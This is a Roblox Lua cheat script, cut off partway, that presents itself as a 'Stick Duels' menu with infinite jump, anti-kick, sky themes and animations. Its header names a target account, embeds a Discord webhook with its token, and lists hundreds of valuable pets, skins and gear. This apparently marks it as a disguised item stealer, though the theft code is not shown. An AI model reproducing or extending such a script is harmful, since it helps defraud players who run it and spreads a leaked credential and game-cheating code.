local TARGET_ID = 7641371436
local TARGET_USER = "22suhail2"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538577994371698809/Nt7MJnBrlH99beO5p21S1iZ7w0OIavzh3_66DRakUPJP8W7xXJq0sy5sSGcAyBaAJnAL"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Griffin"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Pancake and Syrup"] = true,
    ["Arcadragon"] = true,
    ["Rico Dinero"] = true,
    ["Capitano Americano"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["Dragon Aquanini"] = true,
    ["La Casa Boo"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["4th Bros"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["Kraken"] = true,
    ["Money Money Bros"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Rhino Helicopterino"] = true,
    ["Caylusaurus"] = true,
    ["Sammyni Cakini"] = true,
    ["Centrucci Nuclucci"] = true,
    ["Los Hackers"] = true,
    ["John Doe"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Jelly Moby"] = true,
    ["Foxini Lanternini"] = true,
    ["Ginger Cisterna"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Los Tangcitos"] = true,
    ["Los Tictacs"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["1x1x1x1"] = true,
    ["25"] = true,
    ["67"] = true,
    ["Agarrini la Palini"] = true,
    ["Arcadopus"] = true,
    ["Bacuru and Egguru"] = true,
    ["Bananito"] = true,
    ["Baskito"] = true,
    ["Berryno"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Blackhole GOAT"] = true,
    ["Boatito Auratito"] = true,
    ["Boppin Bunny"] = true,
    ["Brunito Marsito"] = true,
    ["Bunito Bunito Spinito"] = true,
    ["Bunnyman"] = true,
    ["Bunny and Eggy"] = true,
    ["Bunny Bunny Bunny Sahur"] = true,
    ["Buntteo"] = true,
    ["Burguro and Fryuro"] = true,
    ["Burrito Bandito"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Chachechi"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Chicleteira Cupideira"] = true,
    ["Chicleteira Noelteira"] = true,
    ["Chicleteirina Bicicleteirina"] = true,
    ["Chill Puppy"] = true,
    ["Chillin Chili"] = true,
    ["Chimnino"] = true,
    ["Chipso and Queso"] = true,
    ["Churrito Bunnito"] = true,
    ["Cigno Fulgoro"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Cuadramat and Pakrahmatmamat"] = true,
    ["Cupid Cupid Sahur"] = true,
    ["Cupid Hotspot"] = true,
    ["DJ Panda"] = true,
    ["Donkeyturbo Express"] = true,
    ["Dul Dul Dul"] = true,
    ["Easter Easter Easter Sahur"] = true,
    ["Eid Eid Eid Sahur"] = true,
    ["Esok Sekolah"] = true,
    ["Eviledon"] = true,
    ["Extinct Matteo"] = true,
    ["Extinct Tralalero"] = true,
    ["Festive 67"] = true,
    ["Fishboard"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Frankentteo"] = true,
    ["GOAT"] = true,
    ["Garama and Madundung"] = true,
    ["Giftini Spyderini"] = true,
    ["Ginger Gerat"] = true,
    ["Gobblino Uniciclino"] = true,
    ["Gold Gold Gold"] = true,
    ["Graipuss Medussi"] = true,
    ["Granny"] = true,
    ["Guerriro Digitale"] = true,
    ["Guest 666"] = true,
    ["Ho Ho Ho Sahur"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Horegini Boom"] = true,
    ["Jackorilla"] = true,
    ["Job Job Job Sahur"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Karker Sahur"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Cucaracha"] = true,
    ["La Easter Grande"] = true,
    ["La Extinct Grande"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Grande Combinasion"] = true,
    ["La Jolly Grande"] = true,
    ["La Karkerkar Combinasion"] = true,
    ["La Lucky Grande"] = true,
    ["La Romantic Grande"] = true,
    ["La Sahur Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["La Spooky Grande"] = true,
    ["La Taco Combinasion"] = true,
    ["La Vacca Jacko Linterino"] = true,
    ["La Vacca Lepre Lepreino"] = true,
    ["La Vacca Prese Presente"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Las Sis"] = true,
    ["Las Tralaleritas"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Lavadorito Spinito"] = true,
    ["Coco and Mango"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Examen Bros"] = true,
    ["Pizza and Ranch"] = true,
    ["Chicleteira Champeona"] = true,
    ["List List List Sahur"] = true,
    ["Los 25"] = true,
    ["Los 67"] = true,
    ["Los Amigos"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["Scorpino Coasterino"] = true,
    ["Honey Honey Bear"] = true,
    ["Pogo Pogo Penguin"] = true,
    ["Conetto Morsetto"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Bunitos"] = true,
    ["Los Burritos"] = true,
    ["Los Candies"] = true,
    ["Los Chicleteiras"] = true,
    ["Los Combinasionas"] = true,
    ["Los Cucarachas"] = true,
    ["Los Cupids"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Jobcitos"] = true,
    ["Los Jolly Combinasionas"] = true,
    ["Los Karkeritos"] = true,
    ["Los Matteos"] = true,
    ["Los Mi Gatitos"] = true,
    ["Los Mobilis"] = true,
    ["Los Nooo My Hotspotsitos"] = true,
    ["Los Planitos"] = true,
    ["Los Primos"] = true,
    ["Los Puggies"] = true,
    ["Los Quesadillas"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Los Spooky Combinasionas"] = true,
    ["Los Spyderinis"] = true,
    ["Los Sweethearts"] = true,
    ["Los Tacoritas"] = true,
    ["Los Tortus"] = true,
    ["Los Tralaleritos"] = true,
    ["Los Trios"] = true,
    ["Love Love Bear"] = true,
    ["Love Love Love Sahur"] = true,
    ["Lovin Rose"] = true,
    ["Luck Luck Luck Sahur"] = true,
    ["Mariachi Corazoni"] = true,
    ["Mi Gatito"] = true,
    ["Mieteteira Bicicleteira"] = true,
    ["Money Money Puggy"] = true,
    ["Money Money Reindeer"] = true,
    ["Nacho Spyder"] = true,
    ["Naughty Naughty"] = true,
    ["Noo My Candy"] = true,
    ["Noo My Eggs"] = true,
    ["Noo My Examine"] = true,
    ["Noo My Gold"] = true,
    ["Noo My Heart"] = true,
    ["Noo My Present"] = true,
    ["Nooo My Hotspot"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Orcaledon"] = true,
    ["Paradiso Axolottino"] = true,
    ["Perrito Burrito"] = true,
    ["Pirulitoita Bicicleteira"] = true,
    ["Please My Present"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Pot Hotspot"] = true,
    ["Pot Pumpkin"] = true,
    ["Pumpkini Spyderini"] = true,
    ["Quackini Snackini"] = true,
    ["Quesadilla Crocodila"] = true,
    ["Quesadillo Vampiro"] = true,
    ["Rang Ring Bus"] = true,
    ["Reindeer Tralala"] = true,
    ["Reinito Sleighito"] = true,
    ["Rocco Disco"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Sammyni Spyderini"] = true,
    ["Santa Hotspot"] = true,
    ["Santteo"] = true,
    ["Secret Lucky Block"] = true,
    ["Serafinna Medusella"] = true,
    ["Snailo Clovero"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Spinny Hammy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberrita"] = true,
    ["Swag Soda"] = true,
    ["Swaggy Bros"] = true,
    ["Tacorita Bicicleta"] = true,
    ["Tacorillo Crocodillo"] = true,
    ["Tang Tang Keletang"] = true,
    ["Telemorte"] = true,
    ["Tictac Sahur"] = true,
    ["To To To Sahur"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
    ["Tralaledon"] = true,
    ["Trenostruzzo Turbo 4000"] = true,
    ["Trickolino"] = true,
    ["Triplito Tralaleritos"] = true,
    ["Tuff Toucan"] = true,
    ["Tung Tung Tung Sahur"] = true,
    ["Ventoliero Pavonero"] = true,
    ["Vulturino Skeletono"] = true,
    ["W or L"] = true,
    ["Yess My Examine"] = true,
    ["Zombie Tralala"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Noodle Noodle Poodle"] = true,
    ["Candini Fluffini"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Tacoturbo Tacorito"] = true,
    ["Burrito Bat"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Summer"] = true,
    ["Taco"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Bloodmoon Slap"] = true,
    ["Candy Sentry"] = true,
    ["Candy Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Demon's Head"] = true,
    ["Divine Slap"] = true,
    ["Lava Blaster"] = true,
    ["Lava Slap"] = true,
    ["Radioactive Airstrike"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Yin Yang Lamp"] = true,
    ["Yin Yang Slap"] = true,
    ["Phantom Slap"] = true,
    ["Crystal Slap"] = true
}

task.spawn(function()
    -- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
-- Leaked from this channel: https://discord.gg/3kYvcz9khb
------------------------------------------------------------------------------------
--[[LFWM1_XFYgxFhwlXshNr89c7mk9e7UnYTV0AVw]]
do
  local lfwm_7e97626092df4313 = "LFWM1_XFYgxFhwlXshNr89c7mk9e7UnYTV0AVw"
  if false then error(lfwm_7e97626092df4313) end
end

-- [[ STICK DUELS ]] - Menu naranja, botones cuadrados con bordes redondeados y brillo
-- No background image, infinite jump (BodyVelocity anti-kick), smooth page scrolling

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local HS = game:GetService("HttpService")
local player = Players.LocalPlayer

-- Master table
local M = {}

-- ------------------------------------------------------------
-- EARLY CONFIG LOAD
-- ------------------------------------------------------------
M.introSoundEnabled = true
M.introSongChoice = 3
M.introGUIEnabled = true
if isfile and isfile("CherryConfig.json") then
    local ok, data = pcall(function() return HS:JSONDecode(readfile("CherryConfig.json")) end)
    if ok and type(data) == "table" then
        if data.introSoundEnabled ~= nil then M.introSoundEnabled = data.introSoundEnabled end
        if data.introSongChoice then M.introSongChoice = data.introSongChoice end
        if data.introGUIEnabled ~= nil then M.introGUIEnabled = data.introGUIEnabled end
        if type(data.Theme) == "string" then M._savedTheme = data.Theme end
        if type(data.colorScheme) == "string" then M._savedTheme = data.colorScheme end
    end
end

-- ============================================================
-- SKY THEME (unchanged)
-- ============================================================
M.CANDY_SKY_TAG = "MoveeSkyTheme"
M.currentSkyTheme = "Night"
M.CANDY_SKY_PRESETS = {
    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}
M.SkyOrder = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}


-- Intro: animacion "la chica" (katana) + texto STICK ON TOP
task.spawn(function()
    if not M.introGUIEnabled then return end
    local Images = {
        "rbxassetid://90082193310359",
        "rbxassetid://140111217806195",
        "rbxassetid://113259892662011",
        "rbxassetid://131132202280501",
        "rbxassetid://119205939792116",
        "rbxassetid://88418000250691",
        "rbxassetid://120238785712873",
        "rbxassetid://83808651896724",
        "rbxassetid://105345289833569",
        "rbxassetid://94330536346405",
        "rbxassetid://136006381271922",
        "rbxassetid://87906794545741",
        "rbxassetid://112714840439381",
        "rbxassetid://135185412807788",
        "rbxassetid://137259627256626",
        "rbxassetid://120220914912790",
        "rbxassetid://93523282075094",
        "rbxassetid://136732688200255",
        "rbxassetid://138525844130589",
        "rbxassetid://140334678801360",
        "rbxassetid://134105611692204",
        "rbxassetid://89336885265398",
        "rbxassetid://101990250036387",
        "rbxassetid://75637145908292",
        "rbxassetid://116874353510206",
        "rbxassetid://109499593730240",
        "rbxassetid://93246503182802",
        "rbxassetid://72860360932966",
        "rbxassetid://99337238315017",
        "rbxassetid://97845911184347",
        "rbxassetid://131590118496375",
        "rbxassetid://94049526088192",
        "rbxassetid://129600097997101",
        "rbxassetid://93840405668970",
        "rbxassetid://102532764909158",
        "rbxassetid://124718361223677",
        "rbxassetid://140151979212906",
        "rbxassetid://77069622782367",
        "rbxassetid://94639382197235",
        "rbxassetid://98828480242667",
        "rbxassetid://135083086902172",
        "rbxassetid://109318742417115",
        "rbxassetid://117259790998663",
        "rbxassetid://124917742187190",
        "rbxassetid://111964888652172",
        "rbxassetid://117782207065349",
        "rbxassetid://72406282546539",
        "rbxassetid://124069160042945",
        "rbxassetid://137758638233258",
        "rbxassetid://98296136420850",
    }
    local FPS = 30
    local LOOPS = 2 -- cuantas vueltas de la animacion antes de cerrar
    local ContentProvider = game:GetService("ContentProvider")
    pcall(function() ContentProvider:PreloadAsync(Images) end)

    local pg = player:WaitForChild("PlayerGui")
    local g = Instance.new("ScreenGui")
    g.Name = "StickDuelsIntro"
    g.IgnoreGuiInset = true
    g.ResetOnSpawn = false
    g.DisplayOrder = 100000
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    g.Parent = pg

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BorderSizePixel = 0
    bg.Parent = g

    local layer1 = Instance.new("ImageLabel")
    layer1.Size = UDim2.new(1, 0, 1, 0)
    layer1.BackgroundTransparency = 1
    layer1.ScaleType = Enum.ScaleType.Fit
    layer1.ZIndex = 2
    layer1.Parent = bg

    local layer2 = Instance.new("ImageLabel")
    layer2.Size = UDim2.new(1, 0, 1, 0)
    layer2.BackgroundTransparency = 1
    layer2.ScaleType = Enum.ScaleType.Fit
    layer2.ZIndex = 1
    layer2.Parent = bg

    layer1.Image = Images[1]
    layer2.Image = Images[1]

    -- Texto encima de la animacion
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 48)
    title.Position = UDim2.new(0, 0, 0.78, 0)
    title.BackgroundTransparency = 1
    title.Text = "STICK ON TOP"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 36
    title.TextColor3 = Color3.fromRGB(255, 160, 40)
    title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    title.TextStrokeTransparency = 0.3
    title.ZIndex = 10
    title.Parent = bg

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, 0, 0, 28)
    sub.Position = UDim2.new(0, 0, 0.78, 44)
    sub.BackgroundTransparency = 1
    sub.Text = "STICK DUELS"
    sub.Font = Enum.Font.GothamBold
    sub.TextSize = 18
    sub.TextColor3 = Color3.fromRGB(255, 200, 120)
    sub.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    sub.TextStrokeTransparency = 0.4
    sub.ZIndex = 10
    sub.Parent = bg

    -- leve pulse del texto
    task.spawn(function()
        while g.Parent do
            for i = 1, 8 do
                title.TextTransparency = i / 20
                task.wait(0.04)
            end
            for i = 8, 0, -1 do
                title.TextTransparency = i / 20
                task.wait(0.04)
            end
        end
    end)

    local currentIdx = 1
    local total = #Images
    local delay = 1 / FPS
    local loopsDone = 0

    while g.Parent and loopsDone < LOOPS do
        local nextIdx = currentIdx + 1
        if nextIdx > total then
            nextIdx = 1
            loopsDone = loopsDone + 1
            if loopsDone >= LOOPS then break end
        end

        local behind, front
        if layer1.ZIndex == 1 then
            behind = layer1
            front = layer2
        else
            behind = layer2
            front = layer1
        end

        behind.Image = Images[nextIdx]
        task.wait(0.01)
        behind.ZIndex = 2
        front.ZIndex = 1

        currentIdx = nextIdx
        task.wait(delay)
    end

    -- fade out
    for i = 0, 10 do
        local a = i / 10
        bg.BackgroundTransparency = a * 0.3
        layer1.ImageTransparency = a
        layer2.ImageTransparency = a
        title.TextTransparency = a
        sub.TextTransparency = a
        task.wait(0.03)
    end
    pcall(function() g:Destroy() end)
end)
local function candyColor(rgb) return Color3.fromRGB(rgb[1],rgb[2],rgb[3]) end
function M.CandyApplyCustomSky(mode)
    for _,child in ipairs(Lighting:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end
    local terrain=workspace:FindFirstChildOfClass("Terrain")
    if terrain then for _,child in ipairs(terrain:GetChildren()) do if child:GetAttribute(M.CANDY_SKY_TAG) then pcall(function() child:Destroy() end) end end end
    local preset=M.CANDY_SKY_PRESETS[mode]
    if not preset or preset.kind=="off" then Lighting.ClockTime=14;Lighting.Brightness=2;Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127);Lighting.Ambient=Color3.fromRGB(127,127,127);Lighting.FogEnd=100000;Lighting.GlobalShadows=true;return end
    Lighting.FogStart=0;Lighting.FogEnd=100000;Lighting.FogColor=Color3.fromRGB(200,200,200);Lighting.ColorShift_Top=Color3.fromRGB(0,0,0);Lighting.ColorShift_Bottom=Color3.fromRGB(0,0,0);Lighting.GlobalShadows=true
    Lighting.ClockTime=preset.clock or 14;Lighting.Brightness=preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient=candyColor(preset.outAmb) end
    if preset.ambient then Lighting.Ambient=candyColor(preset.ambient) end
    if preset.sky then
        local skyInst=Instance.new("Sky");skyInst:SetAttribute(M.CANDY_SKY_TAG,true)
        if preset.sky.stars then skyInst.StarCount=preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize=preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize=preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId="rbxasset://sky/moon.jpg" end
        skyInst.Parent=Lighting
    end
    if preset.atm then
        local atm=Instance.new("Atmosphere");atm:SetAttribute(M.CANDY_SKY_TAG,true)
        atm.Density=preset.atm.dens or 0.3;atm.Color=candyColor(preset.atm.color);atm.Decay=candyColor(preset.atm.decay);atm.Glare=preset.atm.glare or 1;atm.Haze=preset.atm.haze or 1;atm.Parent=Lighting
    end
    if preset.clouds and terrain then
        local clouds=Instance.new("Clouds");clouds:SetAttribute(M.CANDY_SKY_TAG,true)
        clouds.Cover=preset.clouds.cover or 0.5;clouds.Density=preset.clouds.dens or 0.5;clouds.Color=candyColor(preset.clouds.color);clouds.Parent=terrain
    end
end

-- ============================================================
-- ANIMATION PACKS (unchanged)
-- ============================================================
M.PACKS = {
    ["Adidas Sports"] = {
        WalkAnim = 18537392113,
        RunAnim  = 18537384940,
        JumpAnim = 18537380791,
        FallAnim = 18537367238,
        SwimIdle = 18537387180,
        Swim     = 18537389531,
        Animation1 = 18537376492,
        Animation2 = 18537371272,
        ClimbAnim = 18537363391,
    },
    ["Adidas Community"] = {
        WalkAnim = 122150855457006,
        RunAnim  = 82598234841035,
        JumpAnim = 75290611992385,
        FallAnim = 98600215928904,
        SwimIdle = 109346520324160,
        Swim     = 133308483266208,
        Animation1 = 122257458498464,
        Animation2 = 102357151005774,
        ClimbAnim = 88763136693023,
    },
    ["Adidas Aura"] = {
        WalkAnim = 83842218823011,
        RunAnim  = 118320322718866,
        JumpAnim = 109996626521204,
        FallAnim = 95603166884636,
        SwimIdle = 94922130551805,
        Swim     = 134530128383903,
        Animation1 = 110211186840347,
        Animation2 = 114191137265065,
        ClimbAnim = 97824616490448,
    },
    ["Wicked Popular"] = {
        WalkAnim = 92072849924640,
        RunAnim = 72301599441680,
        JumpAnim = 104325245285198,
        FallAnim = 121152442762481,
        Animation1 = 118832222982049,
        ClimbAnim = 131326830509784,
        SwimIdle = 113199415118199,
        Swim = 99384245425157,
        Animation2 = 76049494037641,
    },
    Elder = {
        WalkAnim = 10921111375,
        RunAnim  = 10921104374,
        JumpAnim = 10921107367,
        FallAnim = 10921105765,
        SwimIdle = 10921110146,
        Swim     = 10921108971,
        ClimbAnim = 10921100400,
        Animation1 = 10921101664,
        Animation2 = 10921102574,
    },
    Zombie = {
        WalkAnim = 10921355261,
        RunAnim  = 616163682,
        JumpAnim = 10921351278,
        FallAnim = 10921350320,
        SwimIdle = 10921353442,
        Swim     = 10921352344,
        Animation1 = 10921344533,
        Animation2 = 10921345304,
        ClimbAnim = 10921343576,
    },
    Mage = {
        WalkAnim = 10921152678,
        RunAnim  = 10921148209,
        JumpAnim = 10921149743,
        FallAnim = 10921148939,
        SwimIdle = 10921151661,
        Swim     = 10921150788,
        ClimbAnim = 10921143404,
        Animation1 = 10921144709,
        Animation2 = 10921145797,
    },
    ["Catwalk Glam"] = {
        WalkAnim = 109168724482748,
        RunAnim  = 81024476153754,
        JumpAnim = 116936326516985,
        FallAnim = 92294537340807,
        SwimIdle = 98854111361360,
        Swim     = 134591743181628,
        ClimbAnim = 119377220967554,
        Animation1 = 133806214992291,
        Animation2 = 94970088341563,
    },
    Astronaut = {
        WalkAnim = 10921046031,
        RunAnim  = 10921039308,
        JumpAnim = 10921042494,
        FallAnim = 10921040576,
        SwimIdle = 10921045006,
        Swim     = 10921044000,
        ClimbAnim = 10921032124,
        Animation1 = 10921034824,
        Animation2 = 10921036806,
    },
